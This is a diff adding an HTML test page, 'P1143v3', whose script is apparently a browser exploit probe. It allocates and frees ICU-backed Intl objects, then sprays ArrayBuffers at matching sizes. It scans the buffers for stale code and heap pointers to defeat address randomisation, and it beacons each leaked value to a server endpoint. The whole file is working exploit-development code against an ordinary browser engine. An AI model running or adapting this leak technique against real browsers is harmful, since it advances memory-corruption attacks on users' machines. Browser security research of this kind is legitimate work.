@@ -1,0 +1,122 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1143v3</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1143v3: DIRECT INTL SPRAY (NO UAF) ===');
+log('info','Question: do freed ICU objects leave vtable ptrs in general heap?');
+B('P1143V3-START','t='+Date.now());
+
+// Step 1: Create Intl objects
+var objs=[];
+var locales=['en-US','de-DE','ja-JP','zh-CN','ar-SA'];
+try{
+  for(var i=0;i<40;i++)
+    objs.push(new Intl.NumberFormat(locales[i%5],{style:'decimal',minimumFractionDigits:i%3}));
+  for(var i=0;i<40;i++)
+    objs.push(new Intl.DateTimeFormat(locales[i%5],{dateStyle:['full','long','medium','short'][i%4]}));
+  for(var i=0;i<40;i++)
+    objs.push(new Intl.Collator(locales[i%5],{sensitivity:['base','accent','case','variant'][i%4]}));
+}catch(e){log('fail','Intl err: '+e.message);}
+log('ok','Created '+objs.length+' Intl objects');
+
+// Exercise all
+try{
+  for(var i=0;i<objs.length;i++){
+    var o=objs[i];
+    if(o.format) try{o.format(12345.67);}catch(e){}
+    if(o.compare) try{o.compare('abc','xyz');}catch(e){}
+  }
+}catch(e){}
+log('ok','Exercised all');
+B('P1143V3-CREATED',objs.length+'');
+
+// Step 2: Null + GC
+for(var i=0;i<objs.length;i++) objs[i]=null;
+objs=null;
+for(var gc=0;gc<6;gc++){
+  var t=[];
+  for(var i=0;i<1500;i++) t.push(new ArrayBuffer(64));
+  t=null;
+}
+log('ok','GC done');
+B('P1143V3-GC','done');
+
+// Step 3: Spray ArrayBuffers at ICU-likely sizes
+// ICU UNumberFormat ~300-600B, UDateFormat ~400-800B, UCollator ~200-400B
+var SIZES=[64,96,128,160,192,224,256,320,384,448,512,640,768,896,1024];
+var spray={};
+for(var si=0;si<SIZES.length;si++){
+  var sz=SIZES[si];
+  spray[sz]=[];
+  for(var k=0;k<50;k++) spray[sz].push(new ArrayBuffer(sz));
+}
+log('ok','Sprayed '+SIZES.length+' sizes x 50');
+B('P1143V3-SPRAYED','sizes='+SIZES.length);
+
+// Step 4: Scan for non-zero (stale data from freed ICU objects)
+var totalNZ=0;
+var codeHits=[];
+var heapHits=[];
+
+for(var si=0;si<SIZES.length;si++){
+  var sz=SIZES[si];
+  var bufs=spray[sz];
+  var nzCount=0;
+
+  for(var k=0;k<bufs.length;k++){
+    var v=new BigUint64Array(bufs[k]);
+    var hasNZ=false;
+    for(var q=0;q<v.length;q++){if(v[q]!==0n){hasNZ=true;break;}}
+    if(!hasNZ) continue;
+    nzCount++;
+
+    // Dump first 8 qwords
+    var dump=[];
+    for(var q=0;q<Math.min(v.length,8);q++) dump.push('q'+q+'='+hex64(v[q]));
+
+    // Classify every non-zero qword
+    var codes=[],heaps=[],smalls=[];
+    for(var q=0;q<v.length;q++){
+      var val=v[q];
+      if(val===0n) continue;
+      var hi=Number(val>>32n);
+      var lo=Number(val&0xFFFFFFFFn);
+      if(hi>=0x10&&hi<=0xFF) heaps.push({q:q,v:hex64(val)});
+      else if((hi>=1&&hi<=0xF)||(hi===0&&lo>=0x100000)) codes.push({q:q,v:hex64(val)});
+      else if(val>0n&&val<0x10000n) smalls.push({q:q,v:Number(val)});
+    }
+
+    if(codes.length>0){
+      codeHits.push({sz:sz,k:k,codes:codes});
+      log('win','CODE! sz='+sz+' k='+k+' count='+codes.length);
+      for(var ci=0;ci<Math.min(codes.length,4);ci++)
+        log('win','  q'+codes[ci].q+'='+codes[ci].v);
+      B('P1143V3-CODE-'+sz+'-'+k,JSON.stringify(codes.slice(0,5)));
+    }
+    if(heaps.length>0){
+      heapHits.push({sz:sz,k:k,heaps:heaps.length});
+      log('ptr','HEAP: sz='+sz+' k='+k+' count='+heaps.length);
+    }
+
+    if(nzCount<=2) B('P1143V3-NZ-'+sz+'-'+k,dump.join('|'));
+  }
+
+  if(nzCount>0){
+    totalNZ+=nzCount;
+    log('info','sz='+sz+': '+nzCount+'/'+bufs.length+' non-zero');
+    B('P1143V3-SZ-'+sz,'nz='+nzCount);
+  }
+}
+
+B('P1143V3-DONE','total_nz='+totalNZ+'|code='+codeHits.length+'|heap='+heapHits.length);
+log('phase','=== DONE: '+totalNZ+' non-zero, '+codeHits.length+' code, '+heapHits.length+' heap ===');
+if(codeHits.length>0) log('win','!!! CODE POINTERS FROM ICU OBJECTS !!!');
+else if(heapHits.length>0) log('info','Heap data only - ICU objects reached general heap but no vtables at spray sizes');
+else if(totalNZ===0) log('fail','ALL ZERO - bmalloc zeroes freed cells OR ICU uses separate allocator');
+else log('info','Some stale data but no code pointers');
+</script></body></html>
